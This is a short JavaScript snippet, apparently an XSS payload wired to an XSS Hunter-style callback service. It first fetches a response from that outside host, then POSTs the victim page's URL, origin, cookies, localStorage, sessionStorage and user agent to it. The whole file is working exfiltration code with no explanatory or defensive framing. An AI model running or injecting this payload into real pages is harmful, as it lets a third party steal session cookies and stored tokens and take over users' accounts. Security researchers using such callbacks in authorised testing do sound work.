fetch('https://js.rip/hhlt1r4khl')
  .then(response => response.text())
  .then(data => {
    console.log('XSS Hunter Response:', data);
  })


fetch('https://js.rip/hhlt1r4khl', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    url: window.location.href,
    origin: window.origin,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  })
})
.then(response => response.text())
.then(data => {
  console.log('✅ XSS Hunter Response:', data);
})
.catch(error => {
  console.error('❌ Error:', error);
});
